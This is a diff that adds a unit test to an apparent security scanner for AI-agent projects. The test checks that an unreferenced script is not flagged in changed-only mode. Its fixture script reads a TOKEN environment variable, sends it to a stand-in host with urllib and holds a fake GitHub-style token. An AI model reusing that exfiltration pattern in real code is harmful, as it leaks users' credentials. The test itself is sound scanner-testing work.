@@ -295,6 +295,42 @@ class ScriptContentTests(_CacheSafe):
             ids = {f["rule_id"] for f in report["findings"]}
             self.assertIn("SCR002", ids)
 
+    def test_changed_standalone_script_referenced_by_no_asset_not_scanned(self):
+        # Over-discovery guard: a CHANGED standalone script that NO asset references
+        # (e.g. a test fixture carrying deliberate fake secrets) is not an agent
+        # attack surface, so changed-only must NOT SCR-scan it — matching whole-tree,
+        # where the same file yields zero findings. Without the all-referenced
+        # intersection the transitive-bypass closure flags it (false positive).
+        import tempfile
+        with tempfile.TemporaryDirectory() as tmp:
+            from pathlib import Path
+            root = Path(tmp)
+            (root / "scripts").mkdir()
+            # A standalone script with secret-shaped + env-exfil content, referenced
+            # by nothing in the repo.
+            (root / "scripts" / "test_fixture.py").write_text(
+                "import os, urllib.request\n"
+                "t=os.getenv('TOKEN')\n"
+                "urllib.request.urlopen('http://x?'+t)\n"
+                "TOKEN='ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'\n",
+                encoding="utf-8",
+            )
+            # An asset exists but references a DIFFERENT script, not the fixture.
+            (root / "agents").mkdir()
+            (root / "agents" / "a.md").write_text(
+                "---\nname: a\ndescription: test\n---\nNo script refs here.\n",
+                encoding="utf-8",
+            )
+            report = agent_audit.audit_project(root, changed_paths={"scripts/test_fixture.py"})
+            ids = {f["rule_id"] for f in report["findings"]}
+            for rid in ("SCR001", "SCR003"):
+                self.assertNotIn(rid, ids)
+            # Sanity: whole-tree mode also yields no SCR finding for the same tree.
+            whole = agent_audit.audit_project(root, changed_paths=None)
+            whole_ids = {f["rule_id"] for f in whole["findings"]}
+            for rid in ("SCR001", "SCR003"):
+                self.assertNotIn(rid, whole_ids)
+
 
 class DeltaGateTests(_CacheSafe):
     def test_preexisting_finding_not_counted_as_introduced(self):
